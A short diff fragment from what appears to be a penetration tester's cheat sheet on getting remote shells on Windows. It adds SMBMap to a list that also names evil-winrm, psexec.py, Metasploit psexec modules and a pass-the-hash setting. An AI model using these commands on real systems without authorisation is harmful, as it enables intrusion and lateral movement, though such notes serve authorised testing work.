@@ -31,6 +31,7 @@ evil-winrm.rb -u user -p pass -i ip // gets powershell shell
 wimrm_script // MSF  set FORCE_VBS true
 
 SMB -
+SMBMap
 psexec.py user@ip cmd.exe // psawns cmd shell
 exploit/windows/psexec //MSF 
 /smb/psexec  // set LPORT to new port // set SMBPASS hash lm:ntlm
